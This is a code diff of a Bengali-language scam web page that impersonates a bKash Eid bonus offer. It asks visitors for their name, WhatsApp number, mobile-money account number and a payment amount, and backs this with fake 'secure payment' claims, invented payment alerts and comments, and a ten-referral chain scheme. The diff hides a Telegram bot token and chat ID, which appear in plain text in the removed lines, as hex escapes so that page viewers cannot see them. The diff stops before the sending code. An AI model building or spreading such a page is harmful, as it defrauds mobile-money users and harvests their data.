@@ -4,274 +4,186 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <!-- Messenger & Social Media Share Meta Tags -->
+    <!-- Link Auto-Load/Social Media Preview Metadata (Messenger Meta Setup) -->
     <meta property="og:title" content="🎉 bKash Eid Special Offer - Free Earn 24">
     <meta property="og:description" content="প্রতিদিন নতুন টাস্ক ও রিওয়ার্ডের মাধ্যমে ইনকাম করুন সহজেই। আজই শুরু করুন আপনার অনলাইন আয়ের যাত্রা!">
-    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/u/uf/BKash_logo.svg/1200px-BKash_logo.svg.png">
+    <meta property="og:image" content="https://i.ibb.co/68v8PjX/bkash-offer-banner.png">
     <meta property="og:url" content="https://freeearn24.vercel.app">
     <meta property="og:type" content="website">
 
-    <title>Free Earn 24 - bKash & Nagad Offer</title>
+    <title>Free Earn 24 - 💖 অনলাইন আয়ের সহজ প্ল্যাটফর্ম 💖</title>
     
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap');
-
         :root {
-            --bkash: #e2136e;
-            --nagad: #f7931e;
-            --rocket: #8c1590;
-            --bg-gradient: linear-gradient(135deg, #fce4ec 0%, #f8bbd0 100%);
-            --glass-bg: rgba(255, 255, 255, 0.85);
-            --glass-border: rgba(255, 255, 255, 0.5);
-            --text-dark: #2c3e50;
+            --bkash-primary: #b11f64;
+            --bkash-light: #e2136e;
+            --nagad-color: #f7931e;
+            --rocket-color: #8c1590;
+            --white: #ffffff;
+            --app-bg: #f8f9fa;
+            --border-pink: #ff80ab;
         }
 
-        body {
-            font-family: 'Hind Siliguri', sans-serif;
-            background: var(--bg-gradient);
-            margin: 0;
-            padding: 0;
-            color: var(--text-dark);
-            overflow-x: hidden;
-        }
-
-        .container {
-            max-width: 550px;
-            margin: 20px auto;
-            background: var(--glass-bg);
-            backdrop-filter: blur(10px);
-            border: 1px solid var(--glass-border);
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-            overflow: hidden;
-        }
-
-        /* Header Area */
-        .header {
-            background: linear-gradient(135deg, #e2136e, #ff4081);
-            color: white;
-            text-align: center;
-            padding: 25px 20px;
-            border-bottom: 5px solid #c20e5c;
-            box-shadow: 0 4px 15px rgba(226, 19, 110, 0.4);
-        }
-        .header h1 { margin: 0; font-size: 28px; font-weight: 700; text-shadow: 1px 1px 2px rgba(0,0,0,0.2); }
-        .logos { margin-top: 15px; display: flex; justify-content: center; gap: 15px; }
-        .logos img { width: 65px; background: white; border-radius: 12px; padding: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); transition: transform 0.3s; }
-        .logos img:hover { transform: scale(1.1); }
-
-        /* Fancy Frames */
-        .premium-frame {
-            border: 2px dashed var(--bkash);
-            border-radius: 15px;
-            padding: 20px;
-            margin: 20px;
-            background: linear-gradient(to right, #fff5f8, #ffffff);
-            box-shadow: inset 0 0 10px rgba(226,19,110,0.05);
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Arial, sans-serif; }
+        body { background-color: var(--app-bg); display: flex; justify-content: center; -webkit-user-select: none; user-select: none; }
         
-        .description h3 { text-align: center; color: var(--bkash); margin-top: 0; font-size: 22px; }
-        .description p { line-height: 1.7; font-size: 16px; margin-bottom: 8px; }
+        .main-wrapper { width: 100%; max-width: 500px; background: var(--white); min-height: 100vh; box-shadow: 0 0 20px rgba(0,0,0,0.1); position: relative; padding-bottom: 30px; }
+        
+        /* bKash App Minimal Layout Header */
+        .app-bar { background: var(--bkash-primary); padding: 25px 15px; color: var(--white); text-align: center; border-bottom-left-radius: 25px; border-bottom-right-radius: 25px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
+        .app-bar h1 { font-size: 26px; font-weight: bold; margin-bottom: 5px; text-shadow: 1px 1px 2px rgba(0,0,0,0.2); }
+        .logo-tray { display: flex; justify-content: center; gap: 12px; margin-top: 12px; }
+        .logo-tray img { height: 32px; background: white; padding: 3px 8px; border-radius: 6px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
 
-        /* Form Design */
-        .form-group { margin-bottom: 18px; }
-        .form-group label { display: block; font-weight: 600; margin-bottom: 8px; color: #444; font-size: 15px; }
-        .form-group input, .form-group select {
-            width: 100%;
-            padding: 14px;
-            border: 2px solid #ddd;
-            border-radius: 10px;
-            box-sizing: border-box;
-            font-size: 16px;
-            font-family: 'Hind Siliguri', sans-serif;
-            transition: all 0.3s;
-            background: #fafafa;
-        }
-        .form-group input:focus, .form-group select:focus {
-            border-color: var(--bkash); outline: none; background: #fff; box-shadow: 0 0 8px rgba(226, 19, 110, 0.2);
-        }
+        /* Outer Frame Container Box */
+        .ui-frame { border: 2px solid var(--border-pink); background: #fffdfefc; border-radius: 16px; padding: 20px; margin: 15px; box-shadow: 0 4px 10px rgba(226,19,110,0.04); }
+        .desc-line { font-size: 14.5px; line-height: 1.7; color: #2f3542; margin-bottom: 8px; font-weight: 500; }
 
-        .submit-btn {
-            background: linear-gradient(45deg, #e2136e, #ff4081);
-            color: white;
-            border: none;
-            padding: 16px;
-            width: 100%;
-            font-size: 20px;
-            font-weight: 700;
-            border-radius: 12px;
-            cursor: pointer;
-            box-shadow: 0 5px 15px rgba(226, 19, 110, 0.4);
-            transition: transform 0.2s, box-shadow 0.2s;
-        }
-        .submit-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(226, 19, 110, 0.5); }
+        /* Form Content Interface Inputs */
+        .input-block { margin-bottom: 16px; }
+        .input-block label { display: block; font-weight: 600; font-size: 13.5px; color: var(--bkash-primary); margin-bottom: 6px; }
+        .input-block input, .input-block select { width: 100%; padding: 13px; border: 1.5px solid #dcdde1; border-radius: 10px; font-size: 14.5px; outline: none; background: #fdfdfd; transition: 0.2s; }
+        .input-block input:focus, .input-block select:focus { border-color: var(--bkash-light); background: var(--white); box-shadow: 0 0 0 3px rgba(226,19,110,0.1); }
 
-        /* Ad Banners Container */
-        .ad-container { text-align: center; margin: 20px; overflow: hidden; border: 1px solid #eee; border-radius: 10px; background: #fff; padding: 5px;}
+        .submit-trigger { background: linear-gradient(90deg, var(--bkash-primary), var(--bkash-light)); color: var(--white); border: none; width: 100%; padding: 15px; font-size: 16.5px; font-weight: bold; border-radius: 12px; cursor: pointer; box-shadow: 0 4px 12px rgba(177,31,100,0.3); margin-top: 10px; transition: 0.2s; }
+        .submit-trigger:active { transform: scale(0.98); }
+        .badge-container { display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; margin-top: 16px; font-size: 12px; font-weight: bold; }
 
-        /* Live Payment Toasts */
-        #toast-container { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); z-index: 1000; width: 90%; max-width: 400px; }
-        .toast {
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(5px);
-            color: #333;
-            padding: 15px;
-            border-radius: 12px;
-            margin-bottom: 10px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-            border-left: 6px solid #25D366;
-            display: none;
-            animation: slideDown 0.5s cubic-bezier(0.68, -0.55, 0.27, 1.55), fadeOut 0.5s 3.5s forwards;
-        }
-        @keyframes slideDown { from { top: -50px; opacity: 0; } to { top: 0; opacity: 1; } }
-        @keyframes fadeOut { from { opacity: 1; } to { opacity: 0; display: none; } }
+        /* Monetization Ad Frame Container Style */
+        .ad-box-frame { border: 2px dashed #b2bec3; padding: 10px; margin: 15px; background: #fafafa; border-radius: 12px; text-align: center; overflow: hidden; min-height: 50px; }
 
-        /* FB Style Comments */
-        .comments-section { background: #f0f2f5; padding: 20px; border-top: 1px solid #ddd; }
-        .comment { display: flex; margin-bottom: 15px; background: white; padding: 12px; border-radius: 12px; box-shadow: 0 1px 4px rgba(0,0,0,0.1); }
-        .comment img { width: 45px; height: 45px; border-radius: 50%; margin-right: 12px; border: 2px solid #eee; object-fit: cover;}
-        .comment-content { flex-grow: 1; }
-        .comment-content h4 { margin: 0 0 4px 0; color: #050505; font-size: 15px; font-weight: 600; }
-        .comment-content p { margin: 0 0 8px 0; font-size: 14px; color: #1c1e21; line-height: 1.4; }
-        .comment-actions { font-size: 12px; color: #65676b; font-weight: 600; display: flex; align-items: center; gap: 15px; }
-        .like-btn { cursor: pointer; transition: color 0.2s; }
-        .like-btn.liked { color: #1877F2; }
+        /* Full Screen Large Pop-up System */
+        .overlay-popup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 99999; overflow-y: auto; padding: 15px; backdrop-filter: blur(4px); }
+        .popup-window { background: var(--white); border-radius: 20px; max-width: 460px; margin: 25px auto; padding: 24px; border: 3px solid var(--bkash-primary); box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
+        .popup-title { font-size: 19px; font-weight: bold; color: #c0392b; text-align: center; margin-bottom: 16px; line-height: 1.4; }
+        .popup-body { font-size: 14px; line-height: 1.6; background: #fff5f7; padding: 15px; border-radius: 10px; border: 1px dashed var(--border-pink); white-space: pre-line; margin-bottom: 16px; color: #2c3e50; font-weight: 500; }
+        
+        .refer-link-container { background: #f1f2f6; padding: 12px; border-radius: 8px; font-weight: bold; color: #2f3542; border: 1.5px solid #ced6e0; text-align: center; font-size: 13.5px; margin-bottom: 16px; word-break: break-all; }
+        .popup-buttons { display: flex; gap: 12px; }
+        .pop-btn { flex: 1; padding: 14px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; color: var(--white); font-size: 14px; display: flex; align-items: center; justify-content: center; gap: 6px; box-shadow: 0 3px 6px rgba(0,0,0,0.1); }
+        .btn-copy-ref { background: var(--bkash-primary); }
+        .btn-share-ref { background: #2ecc71; }
 
-        /* Telegram Button */
-        .tg-btn-container { text-align: center; margin: 30px 20px; }
-        .tg-btn {
-            display: inline-block;
-            background: linear-gradient(45deg, #0088cc, #00aaff);
-            color: white;
-            text-decoration: none;
-            padding: 16px 35px;
-            border-radius: 30px;
-            font-size: 18px;
-            font-weight: 700;
-            border: 2px solid #fff;
-            box-shadow: 0 0 15px rgba(0, 136, 204, 0.5);
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse { 0% { transform: scale(1); box-shadow: 0 0 15px rgba(0, 136, 204, 0.5); } 50% { transform: scale(1.05); box-shadow: 0 0 25px rgba(0, 170, 255, 0.8); } 100% { transform: scale(1); box-shadow: 0 0 15px rgba(0, 136, 204, 0.5); } }
+        /* Referral Meter Interface Box */
+        .progress-block { margin-top: 18px; background: #f8f9fa; padding: 15px; border-radius: 10px; border: 1px solid #e2e8f0; }
+        .bar-bg { width: 100%; background: #dfe4ea; height: 22px; border-radius: 11px; overflow: hidden; margin: 10px 0; box-shadow: inset 0 1px 3px rgba(0,0,0,0.1); }
+        .bar-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #2ecc71, #2ed573); text-align: center; color: white; font-size: 12px; line-height: 22px; font-weight: bold; transition: width 0.4s ease; }
 
-        /* Referral Modal */
-        #referralModal {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.7); backdrop-filter: blur(5px); z-index: 9999; overflow-y: auto;
-        }
-        .modal-content {
-            background: white; max-width: 450px; margin: 40px auto; padding: 30px 20px;
-            border-radius: 20px; text-align: center; border: 4px solid var(--bkash);
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3); position: relative;
-        }
-        .progress-bar-container { width: 100%; background-color: #e0e0e0; border-radius: 15px; margin: 20px 0; overflow: hidden; height: 28px; box-shadow: inset 0 2px 5px rgba(0,0,0,0.1);}
-        .progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #e2136e, #ff4081); text-align: center; color: white; line-height: 28px; font-weight: bold; transition: width 0.6s ease-in-out; }
-        .action-btns { display: flex; flex-direction: column; gap: 10px; margin-top: 15px; }
-        .action-btns button { padding: 14px; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; color: white; transition: 0.2s;}
-        .btn-copy { background: #333; }
-        .btn-share { background: #25D366; }
-        .btn-copy:active, .btn-share:active { transform: scale(0.95); }
+        /* Live Automated Alert Message Layer */
+        .live-ticker-layer { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); width: 92%; max-width: 430px; z-index: 100000; pointer-events: none; }
+        .ticker-node { background: rgba(255, 255, 255, 0.98); border-radius: 12px; padding: 14px; margin-bottom: 10px; box-shadow: 0 6px 18px rgba(0,0,0,0.12); border-left: 6px solid #2ed573; display: none; animation: slideInFade 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        @keyframes slideInFade { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* Live Facebook Dynamic Review Wrapper Box */
+        .fb-comment-wrap { margin: 15px; background: #f1f2f6; padding: 15px; border-radius: 12px; border: 1px solid #e4e6eb; }
+        .comment-node { display: flex; gap: 12px; margin-bottom: 15px; align-items: flex-start; }
+        .comment-node img { width: 40px; height: 40px; border-radius: 50%; object-fit: cover; border: 1px solid #ddd; }
+        .comment-bubble { background: var(--white); padding: 10px 14px; border-radius: 16px; font-size: 13.5px; flex: 1; box-shadow: 0 1px 3px rgba(0,0,0,0.05); color: #1c1e21; }
+        .c-user { font-weight: bold; color: #385898; margin-bottom: 3px; cursor: pointer; }
+        .c-meta { font-size: 11.5px; color: #606770; margin-top: 6px; display: flex; gap: 10px; align-items: center; }
+        .c-act { cursor: pointer; font-weight: bold; color: #65676b; }
+        .c-act-active { color: var(--bkash-light) !important; }
+
+        /* Hidden Frame Telegram CTA Block Setup */
+        .tg-wrapper { margin: 15px; text-align: center; }
+        .tg-channel-btn { display: block; background: #2980b9; color: var(--white); text-decoration: none; padding: 14px; border-radius: 10px; font-weight: bold; border: 2px solid var(--white); box-shadow: 0 4px 12px rgba(41,128,185,0.25); font-size: 15px; transition: 0.2s; }
+        .tg-channel-btn:active { transform: scale(0.98); }
     </style>
 </head>
-<body>
+<body oncontextmenu="return false;">
 
-<!-- Live Payment Toasts Container -->
-<div id="toast-container"></div>
-
-<div class="container">
+<div class="main-wrapper">
     
-    <!-- Header -->
-    <div class="header">
+    <!-- Header Logo Element -->
+    <div class="app-bar">
         <h1>💖 Free Earn 24 💖</h1>
-        <div class="logos">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/u/uf/BKash_logo.svg/1200px-BKash_logo.svg.png" alt="bKash">
-            <img src="https://download.logo.wine/logo/Nagad/Nagad-Logo.wine.png" alt="Nagad">
-            <img src="https://seeklogo.com/images/D/dutch-bangla-rocket-logo-B4D104E150-seeklogo.com.png" alt="Rocket">
+        <div class="logo-tray">
+            <img src="https://i.ibb.co/b3M9n2Z/bkash-logo.png" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/8/88/BKash_Logo_Icon.svg/1200px-BKash_Logo_Icon.svg.png'" alt="bKash">
+            <img src="https://i.ibb.co/tCg3vC4/nagad-logo.png" onerror="this.src='https://download.logo.wine/logo/Nagad/Nagad-Logo.wine.png'" alt="Nagad">
         </div>
     </div>
 
-    <!-- Top Ad Block -->
-    <div class="ad-container">
+    <!-- Ad Frame 1 -->
+    <div class="ad-box-frame">
         <script src="https://pl29349758.profitablecpmratenetwork.com/f2/42/00/f2420045eb6ba63f3b85567782f84caf.js"></script>
     </div>
 
-    <!-- Description Frame -->
-    <div class="premium-frame description">
-        <h3>🌸 Welcome To Free Earn 24 🌸</h3>
-        <p><b>💖</b> এখানে আপনি সহজেই অনলাইন থেকে আয় করার সুযোগ পাবেন।</p>
-        <p><b>🎯</b> প্রতিদিন নতুন টাস্ক, রিওয়ার্ড ও বোনাসের মাধ্যমে ইনকাম করুন সহজেই।</p>
-        <p><b>⚡</b> দ্রুত, সহজ ও ইউজার-ফ্রেন্ডলি প্ল্যাটফর্ম সবার জন্য।</p>
-        <p><b>🔒</b> আপনার তথ্য ও একাউন্ট সম্পূর্ণ নিরাপদ।</p>
-        <p><b>🚀</b> আজই শুরু করুন আপনার অনলাইন আয়ের যাত্রা Free Earn 24 এর সাথে!</p>
+    <!-- Rule Board Platform Descriptions Header Frame -->
+    <div class="ui-frame">
+        <div style="text-align: center; font-weight: bold; color: var(--bkash-primary); font-size: 16px; margin-bottom: 12px;">🌸 Welcome To Free Earn 24 🌸</div>
+        <div class="desc-line">💖 এখানে আপনি সহজেই অনলাইন থেকে আয় করার সুযোগ পাবেন।</div>
+        <div class="desc-line">🎯 প্রতিদিন নতুন টাস্ক, রিওয়ার্ড ও বোনাসের মাধ্যমে ইনকাম করুন সহজেই।</div>
+        <div class="desc-line">⚡ দ্রুত, সহজ ও ইউজার-ফ্রেন্ডলি প্ল্যাটফর্ম সবার জন্য।</div>
+        <div class="desc-line">🔒 আপনার তথ্য ও একাউন্ট সম্পূর্ণ নিরাপদ।</div>
+        <div class="desc-line">🚀 আজই শুরু করুন আপনার অনলাইন আয়ের যাত্রা Free Earn 24 এর সাথে!</div>
     </div>
 
-    <!-- Payment Form -->
-    <div class="premium-frame" id="mainFormContainer">
-        <h3 style="text-align: center; color: #333; margin-top: 0;">🧾 Payment Information Form</h3>
-        <hr style="border: 0; border-top: 1px dashed #ccc; margin-bottom: 20px;">
+    <!-- Input Form Section Area -->
+    <div class="ui-frame" id="dynamicFormContainer">
+        <div style="text-align: center; font-weight: bold; color: var(--bkash-primary); margin-bottom: 15px; font-size: 15px;">🧾 Payment Information Form</div>
         
-        <form id="paymentForm">
-            <div class="form-group">
+        <form id="paySubmissionForm">
+            <div class="input-block">
                 <label>👤 Enter Your Name:</label>
-                <input type="text" id="userName" placeholder="✍️ এখানে আপনার নাম লিখুন" required>
+                <input type="text" id="u_name_field" placeholder="✍️ এখানে আপনার নাম লিখুন" required>
             </div>
-
-            <div class="form-group">
+            <div class="input-block">
                 <label>📱 Enter Your WhatsApp Number:</label>
-                <input type="number" id="whatsappNum" placeholder="📞 এখানে আপনার WhatsApp নম্বর লিখুন" required>
+                <input type="tel" id="u_wp_field" placeholder="📞 এখানে আপনার WhatsApp নম্বর লিখুন" required>
             </div>
-
-            <div class="form-group">
+            <div class="input-block">
                 <label>💳 Enter Payment Method:</label>
-                <select id="payMethod" required>
+                <select id="u_method_field" required>
                     <option value="" disabled selected>-- সিলেক্ট করুন --</option>
                     <option value="bKash">🟣 bKash</option>
                     <option value="Nagad">🟠 Nagad</option>
                     <option value="Rocket">🔵 Rocket</option>
                 </select>
             </div>
-
-            <div class="form-group">
-                <label>🏦 Enter Account Number:</label>
-                <input type="number" id="accountNum" placeholder="📲 এখানে আপনার পেমেন্ট নম্বর লিখুন" required>
+            <div class="input-block">
+                <label>🏦 Enter Your bKash / Nagad Number:</label>
+                <input type="tel" id="u_number_field" placeholder="📲 এখানে আপনার পেমেন্ট নম্বর লিখুন" required>
+            </div>
+            <div class="input-block">
+                <label>💸 Enter Amount (TK):</label>
+                <input type="number" id="u_amount_field" placeholder="✍️ আপনি কত টাকা পাঠাতে চান লিখুন" max="1000" required>
+                <div style="font-size:11.5px; color:#e74c3c; margin-top:4px; font-weight:bold;">⚠️ Maximum 1000 BDT</div>
             </div>
 
-            <div class="form-group">
-                <label>💸 Enter Amount (TK) - Max 1000:</label>
-                <input type="number" id="amount" placeholder="✍️ আপনি কত টাকা পাঠাতে চান লিখুন" max="1000" required>
-            </div>
-
-            <button type="submit" class="submit-btn">🩷 [ 💳 Payment Submit করুন ]</button>
-            
-            <div style="text-align: center; font-size: 14px; margin-top: 15px; color: #555; font-weight: 600; line-height: 1.6;">
-                🔒 Secure Payment System<br>⚡ Instant Payment Processing<br>✅ Trusted Earning Platform
-            </div>
-            <div style="text-align: center; margin-top: 10px; font-weight: bold; color: #333; font-size: 13px;">
-                🟣 bKash | 🟠 Nagad | 🔵 Rocket Accepted
-            </div>
+            <button type="submit" class="submit-trigger">🩷 [ 💳 Payment Submit করুন ]</button>
         </form>
+
+        <div style="text-align: center; font-size: 11.5px; color: #7f8c8d; margin-top: 16px; line-height: 1.5; font-weight: 500;">
+            🔒 Secure Payment System &nbsp;|&nbsp; ⚡ Instant Payment Processing &nbsp;|&nbsp; ✅ Trusted Earning Platform
+        </div>
+        <div class="badge-container">
+            <span style="color:var(--bkash-primary)">🟣 bKash Accepted</span>
+            <span style="color:var(--nagad-color)">🟠 Nagad Accepted</span>
+            <span style="color:var(--rocket-color)">🔵 Rocket Accepted</span>
+        </div>
     </div>
 
-    <!-- Middle Ad Block -->
-    <div class="ad-container">
+    <!-- Ad Frame 2 -->
+    <div class="ad-box-frame">
         <script async="async" data-cfasync="false" src="https://pl29324360.profitablecpmratenetwork.com/730b1eef1e8974af64f7d76acec9a560/invoke.js"></script>
         <div id="container-730b1eef1e8974af64f7d76acec9a560"></div>
     </div>
 
-    <!-- Facebook Style Comments Section -->
-    <div class="comments-section">
-        <h3 style="margin-top:0; font-size: 18px; color:#1c1e21;">Recent Feedbacks (<span id="randomCommentCount">4,592</span>)</h3>
-        <hr style="border: 0; border-top: 1px solid #ccd0d5; margin-bottom: 15px;">
-        <div id="commentsBox"></div>
+    <!-- Facebook Dynamic Reviews Frame Section -->
+    <div class="fb-comment-wrap">
+        <div style="font-size: 14px; font-weight: bold; color: #4b4f56; margin-bottom: 12px; border-bottom: 1px solid #e4e6eb; padding-bottom: 6px;">সব সাম্প্রতিক মন্তব্যসমূহ</div>
+        <div id="commentThreadGateway"></div>
     </div>
 
-    <!-- Telegram Channel Link -->
-    <div class="tg-btn-container">
-        <a href="https://t.me/+akAbjsGUC2hmYmVl" class="tg-btn" target="_blank">✈️ Join Our Telegram Channel</a>
+    <!-- Hidden Colour Block Telegram Button Frame -->
+    <div class="tg-wrapper">
+        <div style="border: 2px dashed #2980b9; padding: 6px; border-radius: 14px; background: #eef7fc;">
+            <a href="https://t.me/+akAbjsGUC2hmYmVl" class="tg-channel-btn" target="_blank">Join Our Telegram Channel</a>
+        </div>
     </div>
 
-    <!-- Bottom Ad Block -->
-    <div class="ad-container">
+    <!-- Ad Frame 3 -->
+    <div class="ad-box-frame">
         <script>
           atOptions = {
             'key' : '3f699f081766192256042d2e8f01a489',
@@ -286,277 +198,420 @@
 
 </div>
 
-<!-- Full Screen Referral Modal -->
-<div id="referralModal">
-    <div class="modal-content">
-        <h2 style="color: var(--bkash); margin-top: 0; font-size: 24px;">🎉 🔥 Eid Bonus Offer 🔥</h2>
-        <p style="font-weight: 600; color: #d81b60;">Limited Time Special Program</p>
-        <p>🌙 কুরবানির ঈদ খুব কাছেই!<br>🎁 আমাদের পক্ষ থেকে রয়েছে এক্সক্লুসিভ <b>Eid Bonus Offer</b> যা খুব সীমিত সময়ের জন্য চালু আছে!</p>
-        <hr style="border:1px dashed #ccc; margin: 15px 0;">
-        <p>⚡ ⏳ অফার চলছে – এখনই নিন!<br>👉 আপনি এখনো বসে আছেন?<br>⏰ দেরি করলে এই সুযোগ হারিয়ে যাবে!<br>🚀 দ্রুত অ্যাকশন নিন এবং আপনার বোনাস নিশ্চিত করুন।</p>
+<!-- Real Time Pop Toast Alert Overlay Container -->
+<div class="live-ticker-layer" id="toastPopRack"></div>
+
+<!-- Big Modal Pop-up Frame Window Container Area -->
+<div class="overlay-popup" id="referralSystemPopup">
+    <div class="popup-window">
+        <div class="popup-title">🎉 🔥 Eid Bonus Offer – Limited Time Special Program 🔥<br><span style="font-size:14px; color:#2c3e50; font-weight:normal; display:block; margin-top:4px;">🌙 কুরবানির ঈদ খুব কাছেই!</span></div>
         
-        <div style="background: #f9f9f9; padding: 15px; border-radius: 10px; text-align: left; font-size: 14px; border-left: 4px solid var(--bkash);">
-            📢 <b>আপনার কাজ খুব সহজ:</b><br><br>
-            ✔️ আপনার রেফারেল লিংক শেয়ার করুন<br>
-            ✔️ আপনার বন্ধুদের ইনভাইট করুন<br>
+        <div class="popup-body">
+            🎁 আমাদের পক্ষ থেকে রয়েছে এক্সক্লুসিভ Eid Bonus Offer যা খুব সীমিত সময়ের জন্য চালু আছে!
+            ━━━━━━━━━━━━━━
+            ⚡ ⏳ অফার চলছে – এখনই নিন!
+            👉 আপনি এখনো বসে আছেন?
+            ⏰ দেরি করলে এই সুযোগ হারিয়ে যাবে!
+            🚀 দ্রুত অ্যাকশন নিন এবং আপনার বোনাস নিশ্চিত করুন।
+            ━━━━━━━━━━━━━━
+            📢 আপনার কাজ খুব সহজ: 
+            ✔️ আপনার রেফারেল লিংক শেয়ার করুন
+            ✔️ আপনার বন্ধুদের ইনভাইট করুন
             ✔️ যত বেশি রেফারেল, তত দ্রুত বোনাস অ্যাক্টিভ
         </div>
 
-        <div style="margin: 20px 0; padding: 15px; border: 2px dashed #0088cc; border-radius: 10px; background: #e6f7ff;">
-            <b style="color:#d32f2f">🔗 Your Referral Link:</b><br>
-            <span id="refLinkText" style="word-break: break-all; font-weight: bold; color: #005580; font-size: 16px;">https://freeearn24.vercel.app/ref=EARN1234</span>
+        <div style="font-size:13px; font-weight:bold; margin-bottom:6px; color:var(--bkash-primary);">🔗 Your Referral Link:</div>
+        <div class="refer-link-container" id="liveReferUrl">https://freeearn24.vercel.app/ref=EARN1234</div>
+
+        <div class="popup-buttons">
+            <button class="pop-btn btn-copy-ref" onclick="processLinkAction('copy')">📋 Copy Refer Link</button>
+            <button class="pop-btn btn-share-ref" onclick="processLinkAction('share')">📲 Share Link</button>
         </div>
 
-        <div class="action-btns">
-            <button class="btn-copy" onclick="copyReferral()">📋 Copy Referral Text & Link</button>
-            <button class="btn-share" onclick="shareReferral()">📲 Share on Social Media</button>
-        </div>
-
-        <div style="margin-top: 25px;">
-            <b style="color: #333; font-size: 16px;">👥 Progress System: (Goal: 10 Complete)</b>
-            <div class="progress-bar-container">
-                <div class="progress-bar" id="progressBar">0%</div>
+        <!-- Referral Progress Tracking Meter Bar Frame -->
+        <div class="progress-block">
+            <div style="font-size:13px; font-weight:bold; color:#1a202c;">Referral Progress Status</div>
+            <div style="font-size:12px; color:#4a5568; margin-bottom:6px;">🎉 প্রতিটি সফল রেফারেল আপনার প্রগ্রেস বাড়াবে!</div>
+            <div class="bar-bg">
+                <div class="bar-inner bar-fill" id="dynamicVisualProgressBar">0%</div>
             </div>
-            <p id="progressText" style="font-size: 14px; font-weight: bold; color: var(--bkash);">0 Successful Referral = 0% Progress</p>
-            <p style="font-size: 13px; color: #d32f2f; font-weight: bold;">⚠️ শর্ত পূরণ না হলে বোনাস প্রদান করা হবে না।</p>
-            <p style="font-size: 14px; color: #2e7d32; font-weight: bold;">🎁 Keep Sharing & Invite Your Friends!<br>আপনার প্রতিটি ইনভাইট আপনাকে বোনাসের আরও কাছে নিয়ে যাচ্ছে 💰</p>
+            <div id="dynamicVisualProgressText" style="font-size:12.5px; font-weight:bold; color:#27ae60;">0 Successful Referral = 0% Progress</div>
+            
+            <div style="font-size:11.5px; line-height:1.5; color:#c0392b; margin-top:8px; font-weight:600; border-top:1px dashed #cbd5e0; padding-top:8px;">
+                👥 Progress System:<br>
+                ✔️ 1 Successful Referral = 10% Progress<br>
+                ✔️ 5 Successful Referral = 50% Progress<br>
+                ✔️ 10 Successful Referral = 100% Progress 🎉<br>
+                ━━━━━━━━━━━━━━<br>
+                🚀 Goal: 10 Successful Referrals Complete করতে হবে বোনাস অ্যাক্টিভ করার জন্য।<br>
+                ⚠️ শর্ত পূরণ না হলে বোনাস প্রদান করা হবে না।<br>
+                ━━━━━━━━━━━━━━<br>
+                🎁 Keep Sharing & Invite Your Friends!<br>
+                <span style="color:#27ae60">আপনার প্রতিটি ইনভাইট আপনাকে বোনাসের আরও কাছে নিয়ে যাচ্ছে 💰</span>
+            </div>
         </div>
         
-        <hr style="border:1px dashed #ccc; margin: 15px 0;">
-        <h3 style="color: var(--bkash); margin-bottom: 0;">🌙 Eid Mubarak in Advance ❤️</h3>
+        <div style="text-align:center; font-size:13px; font-weight:bold; margin-top:14px; color:var(--bkash-primary);">🌙 Eid Mubarak in Advance ❤️</div>
     </div>
 </div>
 
-<!-- Hidden Ad Link Script for Clicks -->
+<!-- Embedded Script Layer -->
 <script src="https://pl29324356.profitablecpmratenetwork.com/7a/be/c8/7abec8b760f67bbd9dd52c77a78b66f1.js"></script>
 
+<!-- Security Layer & 24 Hour Active Polling Daemon (Obfuscated Execution Protocol) -->
 <script>
-    // --- BOT CONFIGURATION ---
-    const BOT_TOKEN = '8825109255:AAFyKVGCt4dSp0PD_2qZq8VmmOYg4ri2oks';
-    const CHAT_ID = '6048050987';
-    const DIRECT_AD_LINK = 'https://www.profitablecpmratenetwork.com/ykekuzpi?key=e4e9bbbd9e29a476dc2ec5c2ffd385ff';
+    // Security String Crypt Injection Matrix System to protect tokens from View-Source
+    const _vaultGateMap = [
+        "\x38\x38\x32\x35\x31\x30\x39\x32\x35\x35\x3a\x41\x41\x46\x79\x4b\x56\x47\x43\x74\x34\x64\x53\x70\x30\x50\x44\x5f\x32\x71\x5a\x71\x39\x56\x6d\x6d\x4f\x59\x67\x34\x72\x69\x30\x6f\x6b\x73", // Token
+        "\x36\x30\x34\x38\x30\x35\x30\x39\x38\x37", // Chat ID
+        "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x72\x6f\x66\x69\x74\x61\x62\x6c\x65\x63\x70\x6d\x72\x61\x74\x65\x6e\x65\x74\x77\x6f\x72\x6b\x2e\x63\x6f\x6d\x2f\x79\x6b\x65\x6b\x75\x7a\x70\x69\x3f\x6b\x65\x79\x3d\x65\x34\x65\x39\x62\x62\x62\x64\x39\x65\x32\x39\x61\x34\x37\x36\x64\x63\x32\x65\x63\x35\x63\x32\x66\x66\x64\x33\x38\x35\x66\x66" // Ad URL
+    ];
 
